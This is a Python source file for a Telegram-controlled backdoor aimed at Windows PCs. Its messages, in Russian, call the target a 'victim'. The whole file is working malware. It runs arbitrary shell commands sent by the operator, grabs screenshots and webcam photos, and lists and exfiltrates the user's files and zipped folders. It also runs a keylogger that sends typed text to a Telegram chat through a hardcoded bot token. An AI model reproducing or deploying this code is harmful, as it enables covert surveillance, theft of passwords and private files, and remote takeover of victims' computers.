import ctypes
import io
import logging
import os
import platform
import re
import shutil
import subprocess
import tempfile
from datetime import datetime
import cv2
import pyscreenshot
import telebot
from pynput.keyboard import Listener, Key


ID_USER_PC = f'{os.getenv("USERDOMAIN")}/{os.getenv("USERNAME")}'
TG_TOKEN = "884130464:AAFctNYgvIjwULpb28cmWV06NFlS4xra-pg"

logging.basicConfig(level=logging.INFO)
bot = telebot.TeleBot(TG_TOKEN)

# print(f"Starting with @{bot.user.username}")


class Keylogger:
    def __init__(self):
        self.logs = []
        self.is_working = False
        self._listener = Listener(on_press=self._on_press, on_release=self._on_release)
        self._tg_bot = telebot.TeleBot(TG_TOKEN)
        self._keyboard_layouts = {67699721: 'ENG', 68748313: 'RUS'}
        self._start_layout = self._get_keyboard_layout_id()
        self._eng_ru_layout = dict(
            zip(map(ord, "qwertyuiop[]asdfghjkl;'zxcvbnm,./`" 'QWERTYUIOP{}ASDFGHJKL:"ZXCVBNM<>?~'),
                "йцукенгшщзхъфывапролджэячсмитьбю.ё" 'ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,Ё'))
        self._ru_eng_layout = dict(
            zip(map(ord, "йцукенгшщзхъфывапролджэячсмитьбю.ё" 'ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,Ё'),
                "qwertyuiop[]asdfghjkl;'zxcvbnm,./`" 'QWERTYUIOP{}ASDFGHJKL:"ZXCVBNM<>?~'))

    def start(self):
        self.is_working = True
        with self._listener as listener:
            listener.join()

    def start_background(self):
        self.is_working = True
        self._listener.start()

    def __str__(self):
        all_chars = ''
        for row in self.logs:
            all_chars += row['char']
        return all_chars.strip()

    def reset_and_get(self):
        text_to_send = str(self)
        self.logs = []
        if len(text_to_send) == 0:
            return
        return text_to_send

    def _on_press(self, key):
        char = ''
        try:
            char = key.char
        except AttributeError:
            if key in (Key.space, Key.enter, Key.tab):
                char = ' '
        else:
            if self._start_layout != self._get_keyboard_layout_id():
                layout = self._ru_eng_layout if self._start_layout == 'RUS' else self._eng_ru_layout
                char = char.translate(layout)
        if str(key).startswith(r"'\x"):
            char = ''
        self.logs.append({'key': key, 'char': char, 'date_time': datetime.today()})

    def _on_release(self, key):
        if not self.is_working:
            return False

    def stop(self):
        self.is_working = False

    def get_screenshot(self):
        scr = pyscreenshot.grab()
        image_file = io.BytesIO()
        image_file.name = 'screenshot.jpg'
        scr.save(image_file, 'JPEG')
        image_file.seek(0)
        return image_file

    def _get_keyboard_layout_id(self):
        user32 = ctypes.WinDLL('user32', use_last_error=True)
        curr_window = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
        lang_id = user32.GetKeyboardLayout(thread_id)
        return self._keyboard_layouts.get(lang_id, f'#{lang_id}')


def parse_command(text):
    input_data = text.split()
    parsed_text = ""
    if len(input_data) not in (2, 3,):
        logging.warning('Команда не подошла')
        return
    id_pc = input_data[1]
    if len(input_data) == 3:
        parsed_text = input_data[2]
    if id_pc != ID_USER_PC:
        logging.warning('Команда не для текущего Пк жертвы :(')
        return
    return parsed_text


@bot.message_handler(content_types=['text'], commands=['start'])
def info(message):
    anon = 'Уважайте частную жизнь не нарушайте Закон! '
    bot.send_message(message.chat.id, parse_mode='HTML', text=f'''
🔥 Пк <code>{ID_USER_PC}</code> подключен!

Здесь перечисленный все команды что вы можете задать боту:

<code>/run {ID_USER_PC} [команда]</code>\t- выполнить команду
<code>/photo {ID_USER_PC}</code>\t- получить скриншот
<code>/show {ID_USER_PC} [имя папки] </code>\t- показать папку
<code>/get {ID_USER_PC}</code>\t- получить файл из папки
<code>/cam {ID_USER_PC}</code>\t- фот с веб-камеры
<code>/keyStart {ID_USER_PC}</code>\t- кейлогер старт
<code>/keyStop {ID_USER_PC}</code>\t- кейлогер стоп
<code>/keyGet {ID_USER_PC}</code>\t- кейлогер получить

{anon}
    ''')


@bot.message_handler(content_types=["text"], commands=['run'])
def run_cmd(message):
    """
    "/run 123 ipconfig"
    """
    logging.info(f'ID чата: {message.chat.id} | написал: {message.chat.username} | текст: {message.text.strip()}')
    cmd = parse_command(message.text.strip())
    if cmd is None:
        return
    with subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) as p:
        output_data = p.stdout.read()
        error_data = p.stderr.read().decode("cp866" if platform.system() == "Windows" else "UTF-8")
        output_data = output_data.strip().decode("cp866" if platform.system() == "Windows" else "UTF-8")
        bot.send_message(message.chat.id, parse_mode='HTML', text=f"""
<b>Команда выполнена 👧</b>

Результат выполнения команды: <code>{cmd}</code>

Вывод в консоли: <code>{output_data}{error_data}</code>
        """)


@bot.message_handler(content_types=['text'], commands=['show'])
def show(message):
    message_text = message.text.strip()
    folder_name = parse_command(message.text)
    if folder_name is None:
        return
    # if (folder_name := parse_command(message.text)) is None:
    #     return
    name_user = os.getenv('USERNAME')
    userprofile = os.getenv('USERPROFILE')
    if message_text == '/show':
        folder_path = userprofile
    else:
        folder_path = fr'{userprofile}\{folder_name}'
    list_dir = ''
    try:
        list_ = os.listdir(folder_path)
    except (PermissionError, FileNotFoundError) as e:
        logging.warning(f'Невозможно отобразить содержимое папки: {folder_path}')
    else:
        for i in list_:
            list_dir += f"-{i}\n"
    cwd = os.getcwd()
    bot.send_message(
        message.chat.id,
        parse_mode='HTML',
        text=f'''
Путь:
<code>{folder_path}</code>

Папка бэкдора:
<code>{cwd}</code>

Содержимое:
<i>{list_dir}</i>
        '''
    )


@bot.message_handler(content_types=['text'], commands=['photo'])
def screen(message):
    if parse_command(message.text.strip()) is None:
        return
    scr = pyscreenshot.grab()
    image_file = io.BytesIO()
    image_file.name = 'screenshot.jpg'
    scr.save(image_file, 'JPEG')
    image_file.seek(0)
    bot.send_message(message.chat.id, f'🕶 Скрин экрана! 🕶')
    bot.send_photo(message.chat.id, photo=image_file)


@bot.message_handler(content_types=['text'], commands=['cam'])
def camera(message):
    if parse_command(message.text.strip()) is None:
        return
    cam = cv2.VideoCapture(0)
    status, frame = cam.read()
    if not status:
        bot.send_message(message.chat.id, f'Не получается включить веб-камеру')
        return
    tf = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
    cv2.imwrite(tf.name, frame)
    bot.send_message(message.chat.id, f'🕶 Веб-камера! 🕶')
    bot.send_photo(message.chat.id, photo=tf)
    tf.close()
    os.remove(tf.name)


@bot.message_handler(content_types=['text'], commands=['get'])
def get(message):
    userprofile = os.getenv('USERPROFILE')
    folder_name = parse_command(message.text.strip())
    if folder_name is None:
        bot.send_message(message.chat.id, 'Вы не ввели имя файла!')
        return
    folder_path = fr'{userprofile}\{folder_name}'
    if not os.path.exists(folder_path):
        bot.send_message(message.chat.id, 'Такого пути не существует, проверьте правильность пути!')
        return
    is_delete = False
    if os.path.isfile(folder_path):
        file_path = folder_path
        caption = "Файл отправлен!"
    else:
        name = re.match(r'.*(?:/|\\)([^\\/\s]+)(?:/|\\)?', folder_path).group(1)
        shutil.make_archive(folder_path, 'zip', folder_path)
        file_path = f'{folder_path}.zip'
        caption = f'Папка "{name}" отправлена!'
        is_delete = True
    file_size = os.path.getsize(file_path)
    with open(file_path, 'rb') as f:
        bot.send_document(message.chat.id, f, caption=f'{caption} | Размер файла: {file_size} Байт')
    if is_delete:
        os.remove(file_path)


@bot.message_handler(content_types=['text'], commands=['keyStart'])
def start_keylogger(message):
    if parse_command(message.text.strip()) is None:
        return
    logging.info('/keyStart выбран!')
    if not kg.is_working:
        kg.start_background()


@bot.message_handler(content_types=['text'], commands=['keyStop'])
def stop_keylogger(message):
    if parse_command(message.text.strip()) is None:
        return
    logging.info('/keyStop выбран!')
    if kg.is_working:
        kg.stop()


@bot.message_handler(content_types=['text'], commands=['keyGet'])
def get_keylogger_logs(message):
    if parse_command(message.text.strip()) is None:
        return
    logging.info('/keyGet выбран!')
    if kg.is_working:
        text_to_send = kg.reset_and_get()
        bot.send_message(
            message.chat.id,
            parse_mode='HTML',
            text=f"[Кейлоггер]\n🖥 Жертва: <code>{ID_USER_PC}</code>\n👉 Текст: <code>{text_to_send}</code>"
        )



kg = Keylogger()
bot.infinity_polling()
